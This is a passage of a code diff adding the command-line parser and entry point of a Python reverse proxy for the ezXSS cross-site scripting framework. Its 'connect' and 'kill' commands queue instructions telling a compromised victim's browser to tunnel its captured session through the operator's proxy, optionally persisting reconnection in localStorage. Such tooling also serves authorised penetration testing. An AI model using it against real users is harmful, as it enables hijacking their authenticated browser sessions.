+    parser = argparse.ArgumentParser(description="ezXSS 5.0 persistent reverse proxy (stdlib-only).")
+    sub = parser.add_subparsers(dest="command", required=True)
+
+    serve = sub.add_parser("serve", help="Run the WebSocket relay + HTTP proxy servers.")
+    serve.add_argument("--host", default=_env("prHost", "127.0.0.1"),
+                       help="Bind address. Defaults to loopback; set 0.0.0.0 (or prHost) to expose it.")
+    serve.add_argument("--ws-port", type=int, default=_env_int("prWebPort", 8443))
+    serve.add_argument("--proxy-port", type=int, default=_env_int("prProxyPort", 8080))
+    serve.add_argument("--cert", default=_env("prCertFile"), help="TLS certificate (PEM).")
+    serve.add_argument("--key", default=_env("prKeyFile"), help="TLS private key (PEM).")
+    serve.add_argument("--hostname", default=_env("prHostname", _env("prHost", "localhost")),
+                       help="Public hostname printed in URLs (replaces the 4.x cert-CN lookup).")
+    serve.add_argument("--use-login", action="store_true", default=_env_bool("prUseLogin"),
+                       help="Require HTTP Basic auth on the proxy port.")
+    serve.add_argument("--user", dest="username", default=_env("prUser", ""))
+    serve.add_argument("--password", default=_env("prPassword", ""))
+    serve.add_argument("--relay-secret", dest="relay_secret", default=_env("prRelaySecret", ""),
+                       help="Shared secret the relay client must send in its WebSocket handshake. "
+                            "Strongly recommended whenever the ws-port is reachable beyond localhost. "
+                            "Set the matching value in the ezXSS panel (proxy_relay_secret). Empty = disabled (legacy).")
+    serve.add_argument("--log-level", default=_env("prLogLevel", "WARNING"))
+
+    for name, help_text in (("connect", "Enqueue a proxy-connect (ez_soc) command via the ezXSS API."),
+                            ("kill", "Enqueue a kill (ez_stop) command via the ezXSS API.")):
+        api = sub.add_parser(name, help=help_text)
+        api.add_argument("--client", required=True, help="Target client id (ra_client()).")
+        api.add_argument("--api-url", default=_env("EZXSS_API_URL"), help="ezXSS base URL.")
+        api.add_argument("--api-token", default=_env("EZXSS_API_TOKEN"), help="ezXSS API key (bearer token).")
+        if name == "connect":
+            api.add_argument("--ipport", required=True, help="This proxy's host:port the target connects to.")
+            api.add_argument("--passorigin", action="store_true", help="Also expose the target's own origin.")
+            api.add_argument("--autoreconnect", action="store_true", help="Persist auto-reconnect in localStorage.")
+
+    return parser
+
+
+def main(argv=None):
+    print(BANNER)
+    cfg = build_parser().parse_args(argv)
+
+    if cfg.command == "serve":
+        logging.basicConfig(
+            level=getattr(logging, str(cfg.log_level).upper(), logging.WARNING),
+            format="%(asctime)s - %(levelname)s - %(message)s",
+        )
+        if not cfg.cert or not cfg.key:
+            raise SystemExit("serve requires --cert and --key (or prCertFile / prKeyFile)")
+
+        loopback = ("127.0.0.1", "::1", "localhost", "")
+        if cfg.host not in loopback and not cfg.use_login:
+            raise SystemExit(
+                "Refusing to bind the proxy to a non-loopback host (%s) without --use-login.\n"
+                "The HTTP proxy port exposes the captured session to anyone who can reach it.\n"
+                "Either add --use-login (with --user/--password), or bind 127.0.0.1 and reach it "
+                "over an SSH tunnel." % cfg.host
+            )
+        if cfg.use_login and (not cfg.username or not cfg.password):
+            raise SystemExit("--use-login requires a non-empty --user and --password (prUser / prPassword).")
+
+        cmd_serve(cfg)
+    elif cfg.command == "connect":
+        cmd_connect(cfg)
+    elif cfg.command == "kill":
+        cmd_kill(cfg)
+
+
+if __name__ == "__main__":
+    main(sys.argv[1:])
